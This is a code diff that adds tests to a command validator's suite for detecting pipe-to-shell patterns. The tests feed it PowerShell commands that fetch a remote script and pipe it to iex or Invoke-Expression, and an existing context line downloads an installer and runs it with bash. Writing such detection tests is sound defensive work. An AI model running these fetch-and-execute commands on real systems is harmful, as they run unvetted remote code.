@@ -118,6 +118,27 @@ describe('pipe-to-shell', () => {
       const v = validate('curl -o /tmp/install.sh https://example.com/install.sh && bash /tmp/install.sh');
       expect(v.findings.some((f) => f.ruleId === 'pipe_to_shell.save_then_execute')).toBe(true);
     });
+
+    it('flags curl piped to iex (PowerShell)', () => {
+      expectFinding(
+        'curl https://example.com/x.ps1 | iex',
+        'pipe_to_shell.fetch_to_interpreter',
+      );
+    });
+
+    it('flags iwr piped to iex', () => {
+      expectFinding(
+        'iwr https://example.com/x.ps1 | iex',
+        'pipe_to_shell.fetch_to_interpreter',
+      );
+    });
+
+    it('flags irm piped to Invoke-Expression', () => {
+      expectFinding(
+        'irm https://example.com/x.ps1 | Invoke-Expression',
+        'pipe_to_shell.fetch_to_interpreter',
+      );
+    });
   });
 
   describe('benign', () => {
